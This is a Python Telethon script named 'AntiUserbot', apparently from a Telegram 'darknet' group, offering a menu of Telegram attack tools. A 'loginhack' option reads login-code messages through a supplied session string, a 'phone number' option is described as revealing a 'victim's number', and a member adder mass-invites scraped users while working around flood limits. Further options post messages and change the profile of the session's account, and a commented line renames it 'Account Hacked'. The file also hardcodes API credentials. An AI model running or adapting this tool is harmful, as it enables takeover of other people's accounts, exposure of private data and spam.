from telethon import TelegramClient, sync, events
from telethon.sessions import StringSession
import getpass
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon import functions, types
from telethon.tl.functions.messages import AddChatUserRequest
from telethon.tl.types import InputPhoneContact
from telethon.tl.functions.contacts import ImportContactsRequest
from master_darknet import code
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.functions.users import GetFullUserRequest
import os, sys
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import LeaveChannelRequest
import asyncio, aiocron, datetime
from telethon import TelegramClient, events, sync, functions, types
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.sessions import StringSession
import os, sys
import time
from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from master_darknet import code
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest
import configparser
import os
import sys
import csv
import traceback
import time
import random
from time import sleep
re="\033[1;31m"
gr="\033[1;32m"
cy="\033[1;36m"
cpass = configparser.RawConfigParser()
cpass.read('config.data')

from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest
#import janob_darknet.client
#janob_darknet
import os, sys
import sys
from time import sleep
print("""\033[33m                  _   _ _    _               _           _    
     /\         | | (_) |  | |             | |         | |   
    /  \   _ __ | |_ _| |  | |___  ___ _ __| |__   ___ | |_  
   / /\ \ | '_ \| __| | |  | / __|/ _ \ '__| '_ \ / _ \| __| 
  / ____ \| | | | |_| | |__| \__ \  __/ |  | |_) | (_) | |_  
 /_/    \_\_| |_|\__|_|\____/|___/\___|_|  |_.__/ \___/ \__| 
                               https://github.com/xiroshigo            
                               """)
words = "\033[31mAntiUserbot\033[32m\nDeveloper: xiroshigo\nCreated time: 2022.02.05\nGroup: @janob_darknet\n"
for char in words:
    sleep(0.01)
    sys.stdout.write(char)
    sys.stdout.flush()
os.system("clear")
print("""\033[33m                  _   _ _    _               _           _    
     /\         | | (_) |  | |             | |         | |   
    /  \   _ __ | |_ _| |  | |___  ___ _ __| |__   ___ | |_  
   / /\ \ | '_ \| __| | |  | / __|/ _ \ '__| '_ \ / _ \| __| 
  / ____ \| | | | |_| | |__| \__ \  __/ |  | |_) | (_) | |_  
 /_/    \_\_| |_|\__|_|\____/|___/\___|_|  |_.__/ \___/ \__| 
                                https://github.com/xiroshigo  
                               """)
                               
darknet2 = """
\033[34m[ \033[91mAntiUserbot Sections \033[34m]

\033[32m[1] loginhack
[2] phone number
[3] profile clock
[4] Member adder
[5] Userbot
[6] Terminal management
[7] Information this tool"""
for char in darknet2:
    sleep(0.01)
    sys.stdout.write(char)
    sys.stdout.flush()
darknet = input("\n\n\033[34mjanob_darknet >>> \033[97m")
if darknet == '1':
	api_id = 10953300
	api_hash = "9c24426e5d6fa1d441913e3906627f87"
	string = code.session
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
		client.send_message("me", client.session.save())
	
	async def main():
	
	    async for message in client.iter_messages(777000):
	        print(message.sender.username, message.text)
	        print('\033[1;32m Telegram: @janob_darknet  Telegram:   @janob_darknet  Telegram:   @janob_darknet  Telegram:   @janob_darknet\033[1;39m')
	
	with client:
	    client.loop.run_until_complete(main())

	
elif darknet == "2":
	api_id = 10953300
	api_hash = "9c24426e5d6fa1d441913e3906627f87"
	######### @janob_darknet
	#os.system("clear")
	
	string = code.session
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
		client.send_message("me", client.session.save())
		result = client(functions.contacts.AddContactRequest(
	        id= input("username: "),
	        first_name=code.first_name,
	        last_name=code.last_name,
	        phone=code.you_phone,
	        add_phone_privacy_exception=True
	    ))
	    #print(result.stringify())
	
	client.start()
	print("\033[1;32mThe program has started and you can see the victim's number by logging into your account\n\nTelegram: @jano _darknet")
	client.run_until_disconnected()
#clock
elif darknet == "3":
	api_id = 15832646
	api_hash = "da7028d79bb7f2ea44f41f15911b9258"
	string = code.session
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
		client.send_message("me", client.session.save())
		nick = input("\033[1;31mNICKNAME:\033[1;32m ")
		client.start()
	
	print("\033[1;31mClock started\n\nPlease waiting 1 minute...")
	@aiocron.crontab("*/1 * * * *")
	async def set_clock():
	    time = datetime.datetime.today().strftime(nick+"    %H:%M  ")
	    async with client:
	        await client(UpdateProfileRequest(first_name=time))
	time.sleep(60)
	print("\033[1;32m\n\nStarted\nDeveloper \033[1;31m@janob_darknet")
	
	
	client.loop.run_forever()
	client.run_until_disconnected()
elif darknet == "4":
	api_id = 10953300
	api_hash = "9c24426e5d6fa1d441913e3906627f87"
	os.system("clear")
	string = code.session
	
	with TelegramClient(StringSession(string), api_id, api_hash) as client:
	    client.send_message("", client.session.save())
	
	client.connect()
	
	users = []
	with open(r"member.csv", encoding='UTF-8') as f:  
	
	    rows = csv.reader(f,delimiter=",",lineterminator="\n")
	    next(rows, None)
	    for row in rows:
	        user = {}
	        user['username'] = row[0]
	        user['id'] = int(row[1])
	        user['access_hash'] = int(row[2])
	        user['name'] = row[3]
	        users.append(user)
	
	chats = []
	last_date = None
	chunk_size = 200
	groups = []
	
	result = client(GetDialogsRequest(
	    offset_date=last_date,
	    offset_id=0,
	    offset_peer=InputPeerEmpty(),
	    limit=chunk_size,
	    hash=0
	))
	chats.extend(result.chats)
	
	for chat in chats:
	    try:
	        if chat.megagroup == True:
	            groups.append(chat)
	    except:
	        continue
	
	print('guruh tanlang:'+cy)
	i = 0
	for group in groups:
	    print(str(i) + '- ' + group.title)
	    i += 1
	
	g_index = input("raqamini yozing: "+re)
	target_group = groups[int(g_index)]
	
	target_group_entity = InputPeerChannel(target_group.id, target_group.access_hash)
	
	mode = int(input("id orqali qoshasmi yoki username: "+cy))
	
	n = 0
	
	for user in users:
	    n += 1
	    if n % 80 == 0:
	        sleep(60)
	    try:
	        print("qoshildi {}".format(user['id']))
	        if mode == 1:
	            if user['username'] == "":
	                continue
	            user_to_add = client.get_input_entity(user['username'])
	        elif mode == 2:
	            user_to_add = InputPeerUser(user['id'], user['access_hash'])
	        else:
	            sys.exit("keyinro qayta uruning.")
	        client(InviteToChannelRequest(target_group_entity, [user_to_add]))
	        print("biroz kuting...")
	        time.sleep(random.randrange(0, 5))
	    except PeerFloodError:
	        print("floodwait ga tushdiz...")
	        print("kutishingiz kerak {} soniya".format(60))
	        time.sleep(100)
	    except UserPrivacyRestrictedError:
	        print("bu odam maxfiylashtirilgan.")
	        print("biroz kuting...")
	        time.sleep(random.randrange(0, 5))
	    except:
	        traceback.print_exc()
	        print("hatolik")
	        continue
	
elif darknet == "5":
	print("\033[91mTHIS SECTION IS NOT YET AVAILABLE ! \033[97m")
elif darknet == "7":
	print("""
[ Programmed By Shohjahon ]
[ Telegram : Janob_darknet ] 
[ Instagram: @darknet_off1cial ]
[ github: github.com/xiroshigo ]
[ Warning : I am not responsible for missed used ]

AntiUserbot news: @janob_darknet
	""")	
elif darknet == "6":
	os.system("clear")
	master = input("""\033[33m


                 _   _ _    _               _           _    
     /\         | | (_) |  | |             | |         | |   
    /  \   _ __ | |_ _| |  | |___  ___ _ __| |__   ___ | |_  
   / /\ \ | '_ \| __| | |  | / __|/ _ \ '__| '_ \ / _ \| __| 
  / ____ \| | | | |_| | |__| \__ \  __/ |  | |_) | (_) | |_  
 /_/    \_\_| |_|\__|_|\____/|___/\___|_|  |_.__/ \___/ \__| 
                                  https://github.com/xiroshigo
                                                             

\033[34m[ \033[91mTerminal Managament  \033[34m]

\033[32m[01] send message
[02] All Chat Scanner 
[03] Old messages
[04] react posts
[05] about change
[06] Nickname change
[07] Username change
[08] Profile image Change
[09] Join public group or channel
[10] Join private group or channel
[11] Leave group or channel

\033[34mjanob_darknet >>> \033[97m""")
	if master == "1":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		#os.system("clear")
		
		
		string = code.session
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		
		
		async def main():
		    guruh = code.chat
		    
		    await client(JoinChannelRequest(guruh))
		    while True:
		    	await client.send_message(code.chat,  input('message: '))
		
		with client:
		    client.loop.run_until_complete(main())
		    
	elif master == "3":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		string = code.session
		
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		async def main():
		
		    async for message in client.iter_messages(code.chat):
		        print(message.sender.username, message.text)
		        print('xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')
		with client:
			client.loop.run_until_complete(main())
			
	elif master == "2":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		######### @janob_darknet
		
		
		string = code.session
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		
		    client.send_message("me", client.session.save())
		###########
		
		
		
		@client.on(events.NewMessage(pattern=".scan"))
		async def chatscan(event):
				async for dailog in client.iter_dialogs():
					print(dailog.name + " \033[1;32m id:\033[1;31m " + str(dailog.id))
		
				
		client.start()
		client.run_until_disconnected()
	elif master == "4":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		#os.system("clear")
		string = code.session
		#
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		
		
		async def main():
		    #reaksiya yuborish
		    
		    await client(SendReactionRequest(
		    peer=code.chat,
		    msg_id=code.msg_id,
		 
		    reaction='👍️'
		))
		
		
		with client:
		    client.loop.run_until_complete(main())
		    print("Succesfully")
	
	elif master == "6":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		string = code.session
		
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		@client.on(events.NewMessage)
		async def _(event):
			
			if '.first_name' in event.raw_text:
			   await client(UpdateProfileRequest(
		   	 first_name= code.first_name
			))
			   #username
			   #await client(UpdateUsernameRequest(janob_darknet))
			   #profile image
			  #
		#bio or name
			   #await client(UpdateProfileRequest(
		   	 #about='Umod va ftg userbotlari uchun AntiUserbot plugini'
			#))
		
		client.start()
		print("run")
		client.run_until_disconnected()
		
	elif master == "5":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		string = code.session
		
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		@client.on(events.NewMessage)
		async def _(event):
			
			if '.about' in event.raw_text:
			   await client(UpdateProfileRequest(
		   	 about= code.about
			))
			   #username
			   #await client(UpdateUsernameRequest(janob_darkner))
			   #profile image
			  #
		#bio or name
			   #await client(UpdateProfileRequest(
		   	 #about='Umod va ftg userbotlari uchun AntiUserbot plugini'
			#))
		
		client.start()
		print("run")
		client.run_until_disconnected()
	elif master == "7":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		string = code.session
		
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		@client.on(events.NewMessage)
		async def _(event):
			if '.image' in event.raw_text:
				
			
			#
			   #username
			   await client(UpdateUsernameRequest(code.username))
			   #profile image
			  #
		#bio or name
			   #await client(UpdateProfileRequest(
		   	 #about='Umod va ftg userbotlari uchun AntiUserbot plugini'
			#))
		
		client.start()
		print("run")
		client.run_until_disconnected()
	elif master == "8":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		#os.system("clear")
		string = code.session
		
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		@client.on(events.NewMessage)
		async def _(event):
			
			if '.test' in event.raw_text:
		#	   await client(UpdateProfileRequest(
		#   	 first_name='Account Hacked'
		#	))
			   #username
			   #await client(UpdateUsernameRequest('fake_7719'))
			   #profile image
			   await client(UploadProfilePhotoRequest(
    client.upload_file('test.jpg')
))
			  #
		#bio or name
			   #await client(UpdateProfileRequest(
		   	 #about='Umod va ftg userbotlari uchun AntiUserbot plugini'
			#))
		
		client.start()
		client.run_until_disconnected()
	elif master == "9":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		#os.system("clear")
		string = code.session
		#
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		
		
		async def main():
			guruh = code.chat
			await client(JoinChannelRequest(guruh))
		
		
		with client:
		    client.loop.run_until_complete(main())
		
		
		
		
		client.start()
		client.run_until_disconnected()
	
	elif master == "10":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		
		string = code.session
		#
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		
		
		async def main():
			await client(ImportChatInviteRequest(code.chat))
		
		
		with client:
		    client.loop.run_until_complete(main())
		
		
		
		
		client.start()
		client.run_until_disconnected()
	
	elif master == "11":
		api_id = 10953300
		api_hash = "9c24426e5d6fa1d441913e3906627f87"
		#os.system("clear")
		string = code.session
		#
		with TelegramClient(StringSession(string), api_id, api_hash) as client:
		    client.send_message("me", client.session.save())
		
		
		
		async def main():
			input_channel = code.chat
			await client(LeaveChannelRequest(input_channel))
		
		
		with client:
		    client.loop.run_until_complete(main())
		
		
		
		
		client.start()
		client.run_until_disconnected()
	else:
		print("\033[91mError")
else:
	print("\033[91mError")

		
	
	